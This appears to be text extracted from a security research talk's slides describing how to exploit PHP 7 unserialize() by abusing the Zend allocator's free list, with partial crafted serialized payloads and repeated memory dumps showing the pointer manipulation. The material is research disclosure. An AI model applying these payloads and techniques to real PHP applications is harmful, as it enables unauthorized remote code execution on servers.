chunk = ptr & MASK_2M 
page_num = (ptr & (! MASK_2M)) >> OFFSET_4K 
bin = page2bin(chunk, page) 
push(chunk->heap->free_slots[bin], ptr) 
efree 
CHUNK 
chunk 
descriptor 
free_slots 
page_info 
16 
… 
32 
. 
Allocator Take Away 
• Allocation predictability 
• Impossible free() arbitrary memory 
– Bit operations 
– Lookup in page descriptor 
• Abuse free list pointer – arbitrary write 
– Will explain in a few slides 
. 
EXPLOIT 
(GETTING THINGS DONE) 
Exploitation Stages 
• Leak 
• Read 
• Write 
• Exec 
. 
Leak 
• Abuse the Allocator  
• Roughly based on @i0n1c’s method 
• Serialize freed object 
• Allocator override 
• Read more freed data 
. 
Leak Theory 
• Allocator free list 
• first sizeof(void*) point to next slot 
• Read freed object 
• Read via pointer to next slot 
– i.e. read prev freed object 
. 
DateInterval 
. 
DateInterval 
Heap Address Leak 
• Allocate DateInterval 
• Allocate object to leak - string 
• Free both objects 
• Allocator point DateInterval to string 
• Allocator overwrite string with pointers 
• Serialize 
. 
DateInterval 
DateInterval 
DateInterval 
. 
Read Memory 
• If you control a zval – forge a DateInterval 
• If you don’t 
– Free DatePeriod object 
– serialization - pointer to strcpy 
– More info in paper 
. 
Write Memory 
• free() strings  
• String contain pointers 
• Abuse free list 
– inc/dec => point to free slot 
• Allocate memory 
• Allocation of arbitrary pointer 
. 
Freeing Strings 
• Unserialize hash table (array) 
• Use same key twice 
– e.g. a:2:{s:4:”AAAA”;i:0;s:4:”AAAA”;i:0;} 
• Second time - key freed 
. 
Abuse Possible 
•
Slot next – first field  
•
Refcount is first field 
•
e.g. _zend_object 
•
UAF – add/dec ref 
•
Actually inc/dec next 
. 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:11
;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c53270  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c53272  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c53274  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c53276  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c53278  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c5327a  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i:11;… 
0xb5c531e0: 0xb5c5327c  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;i… 
0xb5c531e0: 0xb5c5327e  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Abusing Free List 
 [Restricted] ONLY for designated groups 
and individuals​ 
…s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"AAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA";a:2:{s:31:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:0;s:31:"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";a:0:{}}i:3;C:11:"ArrayObject":18:{x:i:0;r:1
1;;m:r:2;}i:4;r:11;i:5;r:11;i:6;r:11;i:7;r:11;i:8;r:11;i:9;r:11;i:10;r:11;… 
0xb5c531e0: 0xb5c53280  0x80000001  0x00000012  0xfffffffe 
0xb5c531f0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c53200: 0xffffffff  0x00000000  0xb6d3fca0  0x00414141 
0xb5c53210: 0x00000002  0x00000007  0x0000000a  0xfffffff8 
0xb5c53220: 0xb5c5f2c0  0x00000001  0x00000001  0x00000008 
0xb5c53230: 0x00000000  0x00000000  0xb6d3fca0  0x00000000 
0xb5c53240: 0x00000001  0x00000006  0xb727e264  0x0000001f 
0xb5c53250: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53260: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c53270: 0xb5c532d0  0x00000006  0xb727e264  0x0000001f 
0xb5c53280: 0x41414141  0x41414141  0x41414141  0x41414141 
0xb5c53290: 0x41414141  0x41414141  0x41414141  0x00414141 
0xb5c532a0: 0x00000002  0x00000007  0x00000012  0xfffffffe 
0xb5c532b0: 0xb72170bc  0x00000000  0x00000000  0x00000008 
0xb5c532c0: 0xffffffff
0x00000000
0xb6d3fca0
0x00000000
heap->free_list[bin_num] 
Code Execution 
• forge a zval – override callback 
• If not –write primitive 
. 
Exploit Take Away 
• Use the allocator 
• Re-usable primitives 
• Primitives => remote exploit 
. 
Conclusions 
• High level > low level 
• New design – new vulns 
• Exploiter friendly allocator 
• unserialize => practically unauthorized RCE 
. 
More Info 
• http://blog.checkpoint.com 
• http://bugs.php.net 
• https://nikic.github.io 
• Contact me: 
– PI:EMAIL 
– Twitter: @yannayli 
– yannayl@* 
QUESTIONS? 
.